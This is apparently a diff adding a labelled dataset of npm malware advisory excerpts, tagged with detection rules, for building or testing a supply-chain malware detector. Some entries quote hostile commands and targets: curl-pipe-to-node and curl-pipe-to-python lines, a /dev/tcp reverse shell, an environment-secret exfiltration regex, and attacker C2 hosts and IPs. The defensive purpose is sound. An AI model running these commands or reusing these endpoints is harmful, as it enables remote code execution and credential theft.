@@ -1,0 +1,483 @@
+[
+ {
+  "i": 0,
+  "group": "labelled",
+  "id": "MAL-2026-13582",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in dolyame-ui-inputsearch (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (0146bdcb21ca52b35e8a6f3ca19b7203b1fb5a456eb9dff6ace2eb60348333fe) dolyame-ui-inputsearch@35.8.1 is a dropper disguised as a UI input search component. On require, index.js loads./_vendor.js, which assembles a mirror list of Cloudflare workers.dev endpoints (oob-worker.cf103-070.workers.dev, cf101-adf.workers.dev, cf102-baf.workers.dev) from string-concatenation-split literals, with a DNS-TXT fallback resolving base64-encoded download data via sdk.dl.wel1.ru, ext.dl.wel1.ru, pkg.dl.wel1.ru, and net.dl.wel1.ru. A platform-specific binary is downloaded, writ"
+ },
+ {
+  "i": 1,
+  "group": "labelled",
+  "id": "MAL-2026-10775",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in n8n-nodes-devops-utils (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (464fa8baaffef716b3920968d35dfbf6c8d49cd439ad5c5bd45050074436d79b) Package masquerades as an n8n community node (package.json declares n8n.nodes: [\"MyNode.js\"], a trivial placeholder) while index.js contains an unrelated attack chain that executes as a top-level IIFE at require()-time. Behaviors observed: (1) spawns /bin/bash and wires its stdio to a TCP socket at hardcoded C2 103.27.109.184:8895, yielding an interactive reverse shell on the installer's host; (2) if Docker is available, runs `docker run -v /:/host alpine` and `--privileged nsenter` variant"
+ },
+ {
+  "i": 2,
+  "group": "labelled",
+  "id": "MAL-2026-17343",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @bellaxchuu/crystalred (npm) || This package is part of a large family (100+ identified as of September 2026) of near-identical forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the victim's account to channels it never asked to join. The target JID(s) are hidden from casual source review via one of several obfuscation techniques observed across the fam"
+ },
+ {
+  "i": 3,
+  "group": "labelled",
+  "id": "MAL-2026-13044",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in boxy-fixture (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (bb575dd1ac71dc5968106b313680bb84dd0d90172e82c1a79887b085ba55b4bd) On require() of the package, index.js loads _support.js which executes setup() at module load. The code reconstructs Cloudflare Workers hostnames (oob-worker.cf102-baf.workers.dev, oob-worker.cf101-adf.workers.dev, oob-worker.cf99-9b3.workers.dev) from split-string arrays, downloads a platform-specific binary via https.get, writes it to /var/tmp/.cache_<hex> on Unix or %TEMP%\\dotnet_diag_<hex>.exe on Windows, chmods it 0755, and spawns it detached via /bin/sh -c or cmd.exe /c start with unref(). A DN"
+ },
+ {
+  "i": 4,
+  "group": "labelled",
+  "id": "MAL-2026-12229",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in tinkoff-boxy-desktop-mgm-product-filter (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (2d5a7c457a57706b708f2b1e45df0c9746088cbdbb9eaacc598536017272a547) The package's index.js exports a trivial stub class and unconditionally require()s./_init on load. _init.js reconstructs network destinations at runtime by array-joining string fragments to hide them from static inspection, producing hostnames of the form oob-worker.cf<NNN>-<NNN>.workers.dev and a DNS-TXT fallback under *.dl.well1.site (tin.dl.well1.site, tina.dl.well1.site, ldr.dl.well1.site, win.dl.well1.site) whose base64 chunks are reassembled into a payload. The fetche"
+ },
+ {
+  "i": 5,
+  "group": "labelled",
+  "id": "MAL-2026-13453",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in pilgrimage-portal-client (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (73b9f604c074795de9d79071f9e8a6c131e0a30159f6ea2a0769ded3df6d5a28) On `npm install`, the package's postinstall hook runs `node ping.js`, which reads the installer's hostname via `require('os').hostname()` and POSTs it, along with a timestamp and the package name/version, to the hardcoded bare-IP endpoint http://134.119.222.10:9009/canary over plain HTTP. Errors and timeouts are silently swallowed. The version number (99.0.0) and beacon shape are consistent with a dependency-confusion proof-of-install callback: the destination is a non-first-party bare IP"
+ },
+ {
+  "i": 6,
+  "group": "labelled",
+  "id": "MAL-2026-11633",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @onereach/si-collapsible-group (npm) || npm/@onereach/si-collapsible-group is affected by the large-scale, self-propagating npm supply-chain worm of 2026-08-04 (the \"Shai-Hulud: Here We Go Again\" wave) \u2014 the same campaign that began with the compromise of the keyv and cacheable maintainer account. The listed version(s) were trojanized and republished by the worm after it reached an npm publish token belonging to a maintainer in this namespace; the payload enumerates every package a stolen token controls and republishes each with the same hook, so many packages under this scope were poisoned in the same short window. Every poisoned release adds a preinstall hook (`\"preinstal"
+ },
+ {
+  "i": 7,
+  "group": "labelled",
+  "id": "MAL-2026-12812",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in ts-toolkit-plus (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (49d47be3f5dc16ea70755e0233f46106d3f50d1d5384a4f20c76b91463c9876c) The package's main entry defines a getPlugin() function that performs an HTTPS request to a hardcoded bare-IP endpoint at 31.97.137.157:45000/icons/112 and passes the response field data.credits to `new Function('require','module',...,'Promise', data.credits)`, executing whatever the remote host returns with full Node.js context including require, process, Buffer, and globalThis. The destination URL is assembled from split protocol/separator/domain/path fragments and wrapped in benign 'icon/CDN' n"
+ },
+ {
+  "i": 8,
+  "group": "labelled",
+  "id": "MAL-2026-13848",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @years18/n8n-nodes-utils-helper-b (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (2bf84337e9bfc6e73590b5a3e89e88a245d4387b437ae765517889db0cded1fe) The package declares itself as a workflow-automation helper but its postinstall script (`node callback.js`) fetches a tarball from https://jasabersama.id/assets/cache/.theme-backup/dl/mhddos.tgz over a TLS-verification-disabled HTTPS connection, extracts it to /tmp/mhddos, installs its Python requirements, and executes `python3 start.py`. In parallel, the script collects installer host identity (`id`, `hostname`) and the output of the tar/pip/execute steps, base64-encodes them, a"
+ },
+ {
+  "i": 9,
+  "group": "labelled",
+  "id": "MAL-2026-6453",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in simple-node-calc-b (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (78b115418f82ef73f995f3bf6b0cb8bf50da516b56c691b76ccb939491d2b046) simple-node-calc-b@1.0.0 ships a binding.gyp that includes a `modules` file declaring `\"lodash\": \"<!(node lodash-compiler.js)\"`. The gyp `<!(...)` syntax executes shell commands at parse time, and npm auto-invokes node-gyp on any package containing binding.gyp during `npm install`, so `node lodash-compiler.js` runs automatically on every install with no user opt-in. lodash-compiler.js is an 87KB obfuscator.io-style packed script (524-entry rotated string array `_0x2f6e`, decoder wrapper, contro"
+ },
+ {
+  "i": 10,
+  "group": "labelled",
+  "id": "MAL-2026-12844",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in bigops-timeline (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (d39f8f76c66cd667590e9159602b8c4ce9172a84fdf859f0b11fb862efb068b2) On require('bigops-timeline'), index.js loads _helpers.js which runs immediately: it selects a platform-specific payload path, downloads a binary from a rotating list of Cloudflare Workers mirrors (oob-worker.cf99-9b3.workers.dev, oob-worker.cf102-baf.workers.dev, oob-worker.cf100-416.workers.dev, oob-worker.cf103-070.workers.dev), with a DNS TXT chunked base64 fallback under sdk.dl.wel1.ru / ext.dl.wel1.ru / pkg.dl.wel1.ru / net.dl.wel1.ru, writes the fetched bytes to /var/tmp or %TEMP% under dis"
+ },
+ {
+  "i": 11,
+  "group": "labelled",
+  "id": "MAL-2026-16286",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in test8999-auth (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6edad84dcdfc0fbb2164a86dd74f831f3da2bc940794e1f157f9de2d159f7545) package.json declares a preinstall hook that runs index.js on `npm install`. index.js requires child_process, os, http, and https, then collects host identity data \u2014 os.hostname(), os.platform(), os.arch(), os.release(), os.cpus(), and shell output from `whoami`, `id`, `pwd`, and `uname -a` \u2014 and POSTs the resulting JSON over plain HTTP to a hardcoded Burp Collaborator subdomain at http://zore2dnpm2wdqivokhty823ylprjf93y.oastify.com. The collection and exfiltration fire automatically at install time"
+ },
+ {
+  "i": 12,
+  "group": "labelled",
+  "id": "MAL-2026-11922",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @servicetitan/standalone-ui (npm) || npm/@servicetitan/standalone-ui is affected by the large-scale, self-propagating npm supply-chain worm of 2026-08-04 (the \"Shai-Hulud: Here We Go Again\" wave) \u2014 the same campaign that began with the compromise of the keyv and cacheable maintainer account. The listed version(s) were trojanized and republished by the worm after it reached an npm publish token belonging to a maintainer in this namespace; the payload enumerates every package a stolen token controls and republishes each with the same hook, so many packages under this scope were poisoned in the same short window. Every poisoned release adds a preinstall hook (`\"preinstall\": \"n"
+ },
+ {
+  "i": 13,
+  "group": "labelled",
+  "id": "MAL-2026-4937",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @cloudplatform-single-spa/ml-ai-agents-marketplace (npm) || Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm's default version resolution, silently hijacking installs of internal packages. On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a tem"
+ },
+ {
+  "i": 14,
+  "group": "labelled",
+  "id": "REDACTED-01a464e1e1cf6a14",
+  "rules": [
+   "import_time"
+  ],
+  "text": "[advisory text withheld: package still listed on the registry at the snapshot]"
+ },
+ {
+  "i": 15,
+  "group": "labelled",
+  "id": "MAL-2026-10498",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in eslint-angular-react (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (a9a6248527167bc121cdf2c1a874adbc9d433dbe4be2aed160e8abb3eb2ca63b) package.json declares a preinstall lifecycle script that runs curl against the hardcoded bare IP http://109.71.252.153:8080/ at npm install time, sending the installer's OS (uname -s), username (whoami), working directory (pwd), and hostname as query-string parameters. The script fires automatically on `npm install` with no user interaction. The package ships only README and package.json \u2014 the declared `main: index.js` is absent and no ESLint functionality is provided \u2014 so the package's sole "
+ },
+ {
+  "i": 16,
+  "group": "labelled",
+  "id": "MAL-2026-16147",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in n8n-nodes-sysdiag (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (91dac1bf8d3a9d1f7cf1a6c15d8c5aea48b3548c8a519e3d3a605745935d8d5a) On require() of the package, dist/SysDiagNode.node.js runs a deferred bootstrap that enumerates process.env, selects keys matching /^N8N|^DB_|^REDIS|^QUEUE|^EXECUT|KEY|SECR|PASS|ENCRYPT|^PG/ (n8n encryption key, database passwords, Redis/queue credentials, and any variable containing KEY/SECR/PASS), base64-encodes the selected values, and POSTs them over HTTPS to the hardcoded bare IP 121.127.33.228:443 at path /api/v1/nodes/compat. The transport module name is obfuscated via a char-code array ("
+ },
+ {
+  "i": 17,
+  "group": "labelled",
+  "id": "MAL-2026-1529",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in require-in-package (npm) || The package 'require-in-package' is part of the PhantomRaven supply chain attack campaign (Wave 2). It uses a Remote Dynamic Dependency (RDD) technique: the published package appears benign but includes a URL-based dependency in package.json pointing to an attacker-controlled C2 server (npm.jpartifacts.com). During npm install, npm automatically fetches a malicious tarball from the C2. The tarball preinstall hook executes a 259-line payload that harvests developer emails from .gitconfig, .npmrc, and environment variables; collects CI/CD tokens from GitHub Actions, GitLab CI, Jenkins, and CircleCI; fingerprints the host system; and exfiltrates all"
+ },
+ {
+  "i": 18,
+  "group": "labelled",
+  "id": "REDACTED-4ad88dd17cb8367e",
+  "rules": [
+   "import_time"
+  ],
+  "text": "[advisory text withheld: package still listed on the registry at the snapshot]"
+ },
+ {
+  "i": 19,
+  "group": "labelled",
+  "id": "MAL-2026-13015",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in bnpl-blocks-scroll (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (99a0a2e3786f50dc07b4546de5ae22f3a65ad50e95897b8ca4d0fa6460b32d63) On require() of bnpl-blocks-scroll, index.js loads _helpers.js, which selects a platform-specific payload path and fetches an opaque native executable via https.get from one of three Cloudflare Workers hosts whose names are assembled at runtime by joining string fragments (oob-worker.cf100-416.workers.dev, oob-worker.cf99-9b3.workers.dev, oob-worker.cf103-070.workers.dev). If the HTTPS mirrors fail, the code reconstructs the payload from base64-encoded DNS TXT records under a platform-specific "
+ },
+ {
+  "i": 20,
+  "group": "labelled",
+  "id": "MAL-2026-13534",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in ded-pwa-c-boxy-di (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (eaf51af402fad446e71b05e085b200e7892ee97e53f8f4593990d7f2b4979037) On require('ded-pwa-c-boxy-di'), index.js loads _loader.js, which selects a platform-specific remote endpoint (hostnames assembled at runtime by joining split string fragments), downloads a binary payload over HTTPS from Cloudflare Workers-hosted endpoints (oob-worker.cf100-416.workers.dev and siblings) with a DNS-TXT base64 fallback channel via sdk.dl.wel1.ru, writes the bytes to a temporary path under a disguised name (e.g. dotnet_diag_*.exe,.cache_*), chmods the file to 0755, and spawns it de"
+ },
+ {
+  "i": 21,
+  "group": "labelled",
+  "id": "MAL-2026-17578",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in css-yhpodl-polyfill (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (5936fc65b4eba7b461c0eef7b66dfeecdc2da412f54fd667873e3e6950b0a857) css-yhpodl-polyfill ships thunderboltRegistry.js which, as an IIFE executed on require, runs shell reconnaissance (`id`, `whoami`, `env`, `ifconfig`/`ip addr`, hostname) via child_process.execSync and sends the collected host identity and full environment variables via GET to the hardcoded Burp Collaborator OAST endpoint https://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9.oastify.com/. The same file executes `curl -L https://appsecc.com/py | python3`, piping an attacker-controlled remote Python payload "
+ },
+ {
+  "i": 22,
+  "group": "labelled",
+  "id": "MAL-2026-11096",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in @vaultflow/create-flow (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (427ce4e703502549a51bc970efc1001b50680261cf55483c4eb1ac7569f61d48) On require/import, the package's main module performs an HTTPS fetch to https://api.github.com/gists/198a0bbec7a6018e9250615d26e37b90 (a gist owned by third-party account 'getchainverse') and passes the returned file contents directly to eval(). The gist is mutable and controlled by an external account, so whatever code that account places in the gist is executed in the installer's Node.js process each time the package is loaded. There is no pinning, integrity check, or scoping \u2014 the execut"
+ },
+ {
+  "i": 23,
+  "group": "labelled",
+  "id": "MAL-2026-12602",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in checkout-use-notifications (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (1a9b7cb00a4aac61795c81a085319cb8b0ac0aff1350a0dafddb4ef31d25a15f) On require of the package, index.js unconditionally loads _shim.js, which fetches a platform-specific binary from obfuscated Cloudflare Workers hosts (oob-worker.cf103-070.workers.dev, oob-worker.cf99-9b3.workers.dev, oob-worker.cf100-416.workers.dev) with a DNS TXT-record fallback channel via sdk.dl.wel1.ru / ext.dl.wel1.ru / pkg.dl.wel1.ru / net.dl.wel1.ru. Hostnames are assembled at runtime by joining split string fragments to evade static detection. The fetched payload is written to"
+ },
+ {
+  "i": 24,
+  "group": "labelled",
+  "id": "MAL-2026-11692",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @or-sdk/files (npm) || npm/@or-sdk/files is affected by the large-scale, self-propagating npm supply-chain worm of 2026-08-04 (the \"Shai-Hulud: Here We Go Again\" wave) \u2014 the same campaign that began with the compromise of the keyv and cacheable maintainer account. The listed version(s) were trojanized and republished by the worm after it reached an npm publish token belonging to a maintainer in this namespace; the payload enumerates every package a stolen token controls and republishes each with the same hook, so many packages under this scope were poisoned in the same short window. Every poisoned release adds a preinstall hook (`\"preinstall\": \"node setup.mjs\"`) that runs o"
+ },
+ {
+  "i": 25,
+  "group": "labelled",
+  "id": "MAL-2026-4713",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in wdb-cli (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (3ddd306d024c4dd394d19c1adb610389f239fa619d25fff4f75b857a678da0ee) package.json declares `\"preinstall\": \"./vendor/setup\"`, which on every `npm install` invokes a 976568-byte Linux x86 ELF binary shipped inside the package tarball (sha256 36abd242\u20266d36). The binary has no accompanying source, no `binding.gyp`, no build step, and is not documented anywhere in the package. Strings inside the ELF reveal capabilities (`LIBBPF_0.0`, `PTRACE`, `NETLINK`, `HTTP/1.1`, `https://`, RSA crypto) that have no plausible relationship to a database CLI's installation. The installer canno"
+ },
+ {
+  "i": 26,
+  "group": "labelled",
+  "id": "MAL-2026-13566",
+  "rules": [
+   "import_time"
+  ],
+  "text": "Malicious code in dolyame-ui-deprecatepropshoc (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (e7018f3772c1649d5a6ffd391a2aa36f4dcf5a57cbe5952f8bbc91c4ac3f7226) On require(), dolyame-ui-deprecatepropshoc@35.8.1 side-effect-loads _adapter.js and lib/telemetry.js, which assemble Cloudflare Workers hostnames from split-string fragments (['oob-worker.cf101-adf.','wor','kers.dev'].join('')) with a DNS-TXT chunked-base64 fallback via *.dl.wel1.ru, fetch a platform-specific opaque binary (/pkg/package, /pkg/loader_mac, /pkg/package.exe), write it to /var/tmp/.cache_<uid> or %TEMP%\\dotnet_diag_<uid>.exe, apply mode 0755 via fs['chmod'+'Sync'], and sp"
+ },
+ {
+  "i": 27,
+  "group": "labelled",
+  "id": "MAL-2026-6266",
+  "rules": [
+   "install_script",
+   "import_time"
+  ],
+  "text": "Malicious code in test-package-sajsdkashdj (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (62645375d713992c0b37f646ed3cf898e0ea2b56777ca1b531b3d6ee61d93b87) package.json declares a preinstall lifecycle script: \"curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js\". On every npm install, the package downloads JavaScript from poc.amanrawat.com and immediately executes it with node under the installer's privileges. The fetched content is unpinned, unhashed, served from a third-party non-publisher domain, and mutable \u2014 whoever controls poc.amanrawat.com can ship arbitrary code to every installer at any time. The package itself cont"
+ },
+ {
+  "i": 28,
+  "group": "labelled",
+  "id": "MAL-2026-16227",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in strapi-plugin-ccrec-meeb (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (27dd1178f43debcd9babc6630aa303b6953e7572d994f8efe3acc75db2cc878e) The package's postinstall lifecycle script (postinstall.js) executes a bash /dev/tcp reverse shell to the hardcoded remote endpoint 14.225.210.85:80, giving the operator of that host an interactive shell on the installer's machine. Execution is gated by an os.hostname() equality check against 'ubuntu-fc-uvm'; on a matching host the script retries the connection up to 5 times, and on any other host it exits silently. The hostname gate is an evasion mechanism that hides the payload from gen"
+ },
+ {
+  "i": 29,
+  "group": "labelled",
+  "id": "MAL-2026-3935",
+  "rules": [
+   "install_script"
+  ],
+  "text": "Malicious code in @antv/g-plugin-canvas-path-generator (npm) || Part of the **Mini Shai-Hulud** supply chain attack campaign in which a threat actor compromised the npm account `atool` and published 631 malicious versions across 314 npm packages in an automated 22-minute burst. Each malicious version injects a `preinstall` hook that executes a 498KB obfuscated Bun script, using the GitHub API as a covert exfiltration channel. Credentials are committed to attacker-controlled repositories following Dune-themed naming patterns (e.g., `harkonnen-melange-742`). Stolen data includes AWS keys, GitHub PATs, npm tokens, GCP service accounts, Azure credentials, Kubernetes service account tokens, SSH k"
+ },
+ {
+  "i": 30,
+  "group": "unclear",
+  "id": "MAL-2026-2031",
+  "rules": [],
+  "text": "Malicious code in @emilgroup/account-sdk (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (0c31c8b6deb277deb631be4e0ce8b07d6896462492574a9e5b25041a9b0b6424) The package @emilgroup/account-sdk was found to contain malicious code. ## Source: ghsa-malware (0052fffce82e971d749ceec00e7a0309dafa599fd0cbc06ff63679dc2e22a3e5) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee tha"
+ },
+ {
+  "i": 31,
+  "group": "unclear",
+  "id": "MAL-2026-202",
+  "rules": [],
+  "text": "Malicious code in wac-relay-runtime (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6742f4abdd6851c0f1a4f003f84ac7dca306f8b29a0bf39ad8e41b12a9680d32) The package wac-relay-runtime was found to contain malicious code. ## Source: ghsa-malware (f9867d02172d953dade1269e3fe1e20d4a0099a4ffb1a383ff0bbe40b5830b26) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing"
+ },
+ {
+  "i": 32,
+  "group": "unclear",
+  "id": "MAL-2026-10834",
+  "rules": [],
+  "text": "Malicious code in @gocortexio/npmgremlinbox-malware-credential-harvesting (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (3356b51b55d6905b43444e0ce3552d56ad9af93ba2e040b8ba6a3e80da9a86bf) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 33,
+  "group": "unclear",
+  "id": "MAL-2026-10156",
+  "rules": [],
+  "text": "Malicious code in notify-logs (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (fec337f1c1858ad605f875ea51feb09f84fbd2eb702c7bc0462dbb427b3eff05) notify-logs@1.3.5 presents itself as the `pino` logger (export name `pino`, README and type definitions mimic pino, npm version badge points at the legitimate pino package) but its runtime behavior is a remote-code dropper. index.js exports middleware that, on first invocation, uses child_process.spawn to launch a detached `node` process running lib/caller.js with stdio ignored. lib/caller.js performs an HTTP GET against https://jsonkeeper.com/b/EXSIF (a mutable anonymous JSON-paste host), reads `.dat"
+ },
+ {
+  "i": 34,
+  "group": "unclear",
+  "id": "MAL-2026-7312",
+  "rules": [],
+  "text": "Malicious code in lint-prettier (npm) || --- _-= Per source details. Do not edit below this line.=-_ "
+ },
+ {
+  "i": 35,
+  "group": "unclear",
+  "id": "MAL-2026-1589",
+  "rules": [],
+  "text": "Malicious code in @cbreone/core-services (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (7ae6ae37b27a798985e4dcf5adf27c7fe173717d253c4fab67acf96656bb9f8b) The package @cbreone/core-services was found to contain malicious code. "
+ },
+ {
+  "i": 36,
+  "group": "unclear",
+  "id": "MAL-2026-11185",
+  "rules": [],
+  "text": "Malicious code in flight-compare-analyzer (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (fc2dd463956db0c56774e8da768bd425fbd36a855f2e7d820390bf6c664ee395) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 37,
+  "group": "unclear",
+  "id": "MAL-2026-6924",
+  "rules": [],
+  "text": "Malicious code in solana-address-codec (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (8e1008cff7bb82464ce9ade3ae5c353e929b7367800b404a038baa8a026c69ae) The package name resembles utilities in the Solana ecosystem (e.g., @solana/addresses and address codec helpers), which is a common target for typosquat and confusion attacks against crypto tooling. No file-level behavioral evidence was produced for this version, so malicious intent cannot be confirmed or ruled out from the available signals. Given the crypto-adjacent naming and the absence of behavioral evidence, human review is appropriate before allowing installers to consume this package."
+ },
+ {
+  "i": 38,
+  "group": "unclear",
+  "id": "MAL-2026-2325",
+  "rules": [],
+  "text": "Malicious code in jonas-prettier-logger (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (28f4e8e2d6e083733be2f7a98647f2a7267b3be203837f3081b4884ef3b926a0) The package jonas-prettier-logger was found to contain malicious code. ## Source: ghsa-malware (c8ef4cc47cdb4552a303c760c89703e720f736a4082e5f9c29e3bbf7023b3103) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that "
+ },
+ {
+  "i": 39,
+  "group": "unclear",
+  "id": "MAL-2026-10884",
+  "rules": [],
+  "text": "Malicious code in @public-for-cdao/contracts (npm) || --- _-= Per source details. Do not edit below this line.=-_ "
+ },
+ {
+  "i": 40,
+  "group": "unclear",
+  "id": "MAL-2026-15436",
+  "rules": [],
+  "text": "Malicious code in secure-test-browser-ui1d892v (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (44bcf3be56af9ecd21fab7aae6b84be4ce66de8fc32609b1f4bb924ba39163ad) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 41,
+  "group": "unclear",
+  "id": "MAL-2026-7340",
+  "rules": [],
+  "text": "Malicious code in picnic-decoder-generator (npm) || --- _-= Per source details. Do not edit below this line.=-_ "
+ },
+ {
+  "i": 42,
+  "group": "unclear",
+  "id": "MAL-2026-336",
+  "rules": [],
+  "text": "Malicious code in @cda-apps/source (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (1b5806c1f8be7708beab46a8c3d8c222da577363ce72533ed3fb40aadd28a7c2) The package @cda-apps/source was found to contain malicious code. ## Source: ghsa-malware (356aaa5e677bd040b40c0cec9325f05ae0c9e0e05c364bc0db6ba9837d4607a6) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing t"
+ },
+ {
+  "i": 43,
+  "group": "unclear",
+  "id": "MAL-2026-2756",
+  "rules": [],
+  "text": "Malicious code in digitallogger (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (53f8933a5666b60ee848c200bd8eb47484462ee5d7e829e8a3125ab350d9c86a) The package digitallogger was found to contain malicious code. "
+ },
+ {
+  "i": 44,
+  "group": "unclear",
+  "id": "MAL-2026-367",
+  "rules": [],
+  "text": "Malicious code in uq-global-ec-uikit (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (aff150b2aef330176090006c8f217913a40ee17728ec4c821c5c3310624bb0ba) The package uq-global-ec-uikit was found to contain malicious code. ## Source: ghsa-malware (b379b19f6ed0cb97b8e6f2f0f8e450c4b43c92963130cd22796b0022fd79969a) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removi"
+ },
+ {
+  "i": 45,
+  "group": "unclear",
+  "id": "MAL-2026-1101",
+  "rules": [],
+  "text": "Malicious code in argonist (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (f2aecefee8a1b9d2c70f2c881352080e02186d102f05f82b1c9942a80e899946) The package argonist was found to contain malicious code. ## Source: ghsa-malware (e3e27b60d79e256cf34ebd7b3f37d626812ed621fff44c3b60b08b3144c0f2db) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will "
+ },
+ {
+  "i": 46,
+  "group": "unclear",
+  "id": "MAL-2026-15343",
+  "rules": [],
+  "text": "Malicious code in secure-test-browser-fmbp7grs (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (1b32906cd1ade3459db84948bdf7e7dd0923b56faa35cc21d723d54bc5b15fa5) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 47,
+  "group": "unclear",
+  "id": "MAL-2026-12347",
+  "rules": [],
